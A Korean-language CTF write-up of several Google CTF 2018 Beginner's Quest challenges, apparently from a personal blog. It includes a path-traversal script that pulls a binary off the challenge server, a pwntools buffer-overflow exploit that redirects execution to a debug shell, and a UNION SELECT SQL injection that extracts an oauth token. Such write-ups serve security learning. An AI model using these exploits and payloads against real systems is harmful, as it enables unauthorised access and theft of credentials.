---
layout: post
title: ! ' [GoogleCTF2018 Quals] Begginers Quest (2) '
excerpt_separator: <!--more-->
comments: true
tags:
  - Write-up
  - CTF
---

좀 어려워지긴 했지만 여전히 풀 만 하다! 꾸준히 푸는 중.

CTF 처음 접해보는 친구들한테도 추천 해 주고 싶을정도로 문제가 재미있다.

<!--more-->

![]({{ site.baseurl }}/images/KRater/2018-08-02-Begginers-Quest-2/pic01.PNG)

많이 풀었다~

## FIRMWARE

> FIRMWARE
>
> Offhub
>
> re
>
> After unpacking the firmware archive, you now have a binary in which to go hunting. Its now time to walk around the firmware and see if you can find anything. 

Attachment를 다운로드 받으면 challenge2.ext4 이라는 파일이 보인다. ext4 파일은 리눅스 파일 시스템이라고 하는데, 이를 마운트시켜보자.

![]({{ site.baseurl }}/images/KRater/2018-08-02-Begginers-Quest-2/pic02.PNG)

파일시스템을 직접 마운트시켜본건 거의 처음인데, 잘못해서 서버 몽땅 날릴뻔..^^ 다음부턴 주의해야겠다.

아무튼 loop 장치에 마운트 시키고 루트 디렉토리를 뒤져보면 압축파일이 있다. 풀면 바로 플래그 나온다.

![]({{ site.baseurl }}/images/KRater/2018-08-02-Begginers-Quest-2/pic03.PNG)

## GATEKEEPER

> GATEKEEPER
>
> WebPluxMediaPC
>
> re
>
> It's a media PC! All fully purchased through the online subscription revolution empire "GimmeDa$". The PC has a remote control service running that looks like it'll cause all kinds of problems or that was written by someone who watched too many 1990s movies. You download the binary from the vendor and begin reversing it. Nothing is the right way around. 

일반적인 64비트 바이너리다. 뭔가 애니메이션 화려하고 재밌는 귀여운 프로그램이다. 분석해보자.

![]({{ site.baseurl }}/images/KRater/2018-08-02-Begginers-Quest-2/pic04.PNG)

헥스레이로 main 까 보면 저런식으로 되어있다. 붉은 표시를 한 부분이 패스워드를 만들어 주는 부분인데, 단순히 문자열을 거꾸로 뒤집는거다. strcmp 하는 부분을 거꾸로 뒤집어주면 패스워드 완성~

![]({{ site.baseurl }}/images/KRater/2018-08-02-Begginers-Quest-2/pic05.PNG)

## ADMIN UI

> ADMIN UI
>
> Temp-o-matic
>
> pwn-re
>
> The command you just found removed the Foobanizer 9000 from the DMZ. While scanning the network, you find a weird device called Tempo-a-matic. According to a Google search it's a smart home temperature control experience. The management interface looks like a nest of bugs. You also stumble over some gossip on the dark net about bug hunters finding some vulnerabilities and because the vendor didn't have a bug bounty program, they were sold for US$3.49 a piece. Do some black box testing here, it'll go well with your hat. 
>
> $ nc mngmnt-iface.ctfcompetition.com 1337 

![]({{ site.baseurl }}/images/KRater/2018-08-02-Begginers-Quest-2/pic06.PNG)

일단 proc 위치를 찾아야 하는데, 절대경로로는 안 되길래 상대경로로 접근했다.

![]({{ site.baseurl }}/images/KRater/2018-08-02-Begginers-Quest-2/pic07.PNG)

찾아서 self의 maps를 보면 `/home/user/main` 프로그램에 대한 프로세스임을 확인할 수 있다. 일단 `../../../../`이 루트 디렉토리임은 확인이 되었으니, 따라가면 된다.

![]({{ site.baseurl }}/images/KRater/2018-08-02-Begginers-Quest-2/pic08.PNG)

그럼 바이너리를 읽을 수 있다. 이를 토대로 바이너리를 추출하자.

```python
# extract.py
# for GoogleCTF2018 Beginner's Quest, Admin UI

from pwn import *

HOST = "mngmnt-iface.ctfcompetition.com"
PORT = 1337
r = remote(HOST, PORT)

def main () :
    r.recv(1024)
    r.sendline("2")
    r.recvuntil("shown?")
    f = open("extracted", "w")

    r.sendline("../main")
    data = r.recvuntil("=== Management Interface ===").strip()
    data += r.recvuntil("=== Management Interface ===", drop=True).strip()
    f.write(data)
    log.warn(len(data))
    f.close()

if __name__ == '__main__' :
    main()
```

>cragy0516@argos-edu:~/CTF/google2018$ python extract.py 
>
>[+] Opening connection to mngmnt-iface.ctfcompetition.com on port 1337: Done
>
>[!] 111128
>
>[*] Closed connection to mngmnt-iface.ctfcompetition.com port 1337
>
>cragy0516@argos-edu:~/CTF/google2018$ chmod +x extracted 
>
>cragy0516@argos-edu:~/CTF/google2018$ ./extracted 
>
>=== Management Interface ===
>
> 1) Service access
>
> 2) Read EULA/patch notes
>
> 3) Quit

IDA로 분석하면 된다.

![]({{ site.baseurl }}/images/KRater/2018-08-02-Begginers-Quest-2/pic09.PNG)

flag 파일을 읽으니까 우리가 읽을 수 있다.

>=== Management Interface ===
>
> 1) Service access
>
> 2) Read EULA/patch notes
>
> 3) Quit
>
>2
>
>The following patchnotes were found:
>
> \- Version0.3
>
> \- Version0.2
>
>  Which patchnotes should be shown?
>
>  ../flag
>
>  CTF{I_luv_buggy_sOFtware}=== Management Interface ===

플래그 발견~

## ADMIN UI 2

>ADMIN UI 2
>
>Temp-o-matic
>
>pwn-re
>
>That first flag was a dud, but I think using a similar trick to get the full binary file might be needed here. There is a least one password in there somewhere. Maybe reversing this will give you access to the authenticated area, then you can turn up the heat… literally. 

![]({{ site.baseurl }}/images/KRater/2018-08-02-Begginers-Quest-2/pic10.PNG)

여기까지 왔으면 오히려 별로 안어렵다.

비밀번호 만들어주는거 리버싱하면 플래그 바로 나온다.

> === Management Interface ===
>
>  1) Service access
>
>  2) Read EULA/patch notes
>
>  3) Quit
>
> 1
>
> Please enter the backdoo^Wservice password:
>
> CTF{I_luv_buggy_sOFtware}
>
> ! Two factor authentication required !
>
> Please enter secret secondary password:
>
> CTF{Two_PasSworDz_Better_th4n_1_k?}
>
> Authenticated
>
> \> 

## ADMIN UI 3

>ADMIN UI 3
>
>Temp-o-matic
>
>pwn-re
>
>The code quality here is terrible. Even the temperature scale is measured in "Kevins". Just bad Q/A all around here. If they choose to measure in Kevins rather than Kelvins, then it's a sure bet that they can't handle their memory properly. It looks like this also controls the SmartFridge2000 internal temperature for that whole home "just-works" experience. 

간단한 BOF 취약점이다.

debug_shell이 있는데 쓸순 없으니까 그냥 RET만 여기로 옮겨주면 된다.

```python
# exploit.py
# for GoogleCTF2018 Beginner's Quest, Admin UI

from pwn import *

HOST = "mngmnt-iface.ctfcompetition.com"
PORT = 1337
r = remote(HOST, PORT)

def main () :
    r.recv(1024)
    r.sendline("1")
    r.sendline("CTF{I_luv_buggy_sOFtware}")
    r.sendline("CTF{Two_PasSworDz_Better_1_n4ht_k?}")
    r.sendline("A"*0x30+"B"*8+p64(0x41414227))
    r.interactive()

if __name__ == '__main__' :
    main()
```

> cragy0516@argos-edu:~/CTF/google2018$ python exploit.py 
>
> [+] Opening connection to mngmnt-iface.ctfcompetition.com on port 1337: Done
>
> [*] Switching to interactive mode
>
>  1) Service access
>
>  2) Read EULA/patch notes
>
>  3) Quit
>
> Please enter the backdoo^Wservice password:
>
> ! Two factor authentication required !
>
> Please enter secret secondary password:
>
> Authenticated
>
> Unknown command 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB'BAA'
>
> $ quit
>
> Bye!
>
> $ ls -l
>
> total 124
>
> -rw-r--r-- 1 nobody nogroup     26 May 24 15:03 an0th3r_fl44444g_yo
>
> -rw-r--r-- 1 nobody nogroup     25 Jun 18 08:25 flag
>
> -rwxr-xr-x 1 nobody nogroup 111128 Jun 18 08:25 main
>
> drwxr-xr-x 2 nobody nogroup   4096 Jun 18 08:25 patchnotes
>
> $ cat an0th3r_fl44444g_yo
>
> CTF{c0d3ExEc?W411_pL4y3d}
>
> $  

## MEDIA-DB

> MEDIA-DB
>
> WebPluxMediaPC
>
> misc
>
> The gatekeeper software gave you access to a custom database to organize a music playlist. It looks like it might also be connected to the smart fridge to play custom door alarms. Maybe we can grab an oauth token that gets us closer to cake. 
>
> $ nc media-db.ctfcompetition.com 1337

py 파일 받아보면 랜덤으로 섞어주는부분에 취약점이 있다. add 할 때에는 `"`를 필터링 해 주는데, 섞어줄때는 쿼우트를 `'`로 사용해서 인젝션이 가능하다.

그런데 이걸 어떻게 넘겨줘야하나.. 고민을 했다. 특히 SQL 인젝션 관련해서 최근에 공부를 안해서... 근데 쿼리 두개를 어떻게 넘겨줄까 검색하다가 `UNION SELECT` 이 눈에 띄여서 이걸 활용해보기로 했다.

> root@ubuntu:~/CTF/Google2018# nc media-db.ctfcompetition.com 1337
>
> === Media DB ===
>
> 1) add song
>
> 2) play artist
>
> 3) play song
>
> 4) shuffle artist
>
> 5) exit
>
> \> 1
>
> artist name?
>
> 1' UNION SELECT oauth_token, oauth_token FROM oauth_tokens WHERE oauth_token Like '%
>
> song name?
>
> givemeflag
>
> 1) add song
>
> 2) play artist
>
> 3) play song
>
> 4) shuffle artist
>
> 5) exit
>
> \> 4
>
> choosing songs from random artist: 1' UNION SELECT oauth_token, oauth_token FROM oauth_tokens WHERE oauth_token Like '%
>
> == new playlist ==
>
> 1: "CTF{fridge_cast_oauth_token_cahn4Quo}
>
> " by "CTF{fridge_cast_oauth_token_cahn4Quo}
>
> "
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTE4ODIwMTMyMTldfQ==
-->